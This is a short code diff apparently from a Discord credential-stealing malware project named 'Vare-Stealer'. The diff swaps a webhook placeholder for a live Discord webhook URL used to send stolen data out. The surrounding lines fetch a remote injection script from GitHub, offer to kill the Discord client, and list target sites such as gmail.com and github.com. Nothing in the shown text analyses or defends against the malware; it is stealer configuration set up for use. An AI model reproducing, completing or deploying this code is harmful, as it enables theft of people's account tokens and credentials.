@@ -16,7 +16,7 @@ const buf_replace = require('buffer-replace');
 let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";
 
 
-const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
+const %webhookstring% = "https://discord.com/api/webhooks/1443953550576193721/trb67PcBIe7Xf7kXpYsfXTLOerKbCpBop8psQcfbG0UurtbfsW1eU_qTEdqbXWkvNwk2"
 const %INJURLL% = "https://raw.githubusercontent.com/saintdaddy/Vare-Stealer/main/injection/index.js"
 const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
 
@@ -1437,6 +1437,7 @@ async function %VARECHECKSTART%() {
 
 
 %VARECHECKSTART%()
+
 
 
 process.on("uncaughtException", err => console.error(err)).on("unhandledRejection", err => console.error(err));
